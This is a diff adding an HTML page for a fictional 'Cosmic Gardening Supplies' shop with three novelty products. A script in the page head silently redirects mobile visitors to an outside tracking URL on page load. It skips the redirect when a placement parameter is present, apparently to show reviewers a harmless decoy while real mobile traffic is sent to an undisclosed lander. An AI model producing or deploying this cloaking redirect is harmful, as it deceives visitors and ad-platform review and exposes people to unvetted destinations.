@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/de9fa2b0-1366-489a-be81-3b73f541059f?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Gardening Supplies</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #1a1a2e, #16213e);
+            color: #e94560;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #0f3460;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            margin: 0;
+        }
+        nav {
+            display: flex;
+            justify-content: space-around;
+            background-color: #533483;
+            padding: 10px;
+        }
+        nav a {
+            color: #e94560;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        .product {
+            background-color: #16213e;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+        }
+        .product img {
+            max-width: 100%;
+            border-radius: 10px;
+        }
+        footer {
+            background-color: #0f3460;
+            color: #e94560;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Gardening Supplies</h1>
+    </header>
+    <nav>
+        <a href="#">Home</a>
+        <a href="#">Products</a>
+        <a href="#">About Us</a>
+        <a href="#">Contact</a>
+    </nav>
+    <main>
+        <div class="product">
+            <img src="https://placehold.co/200x200" alt="Martian Soil">
+            <h2>Martian Soil</h2>
+            <p>Grow your plants in authentic red planet soil!</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <img src="https://placehold.co/200x200" alt="Nebula Fertilizer">
+            <h2>Nebula Fertilizer</h2>
+            <p>Infuse your plants with the power of stars!</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <img src="https://placehold.co/200x200" alt="Anti-Gravity Pots">
+            <h2>Anti-Gravity Pots</h2>
+            <p>Let your plants float in mid-air!</p>
+            <button>Add to Cart</button>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Cosmic Gardening Supplies. <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
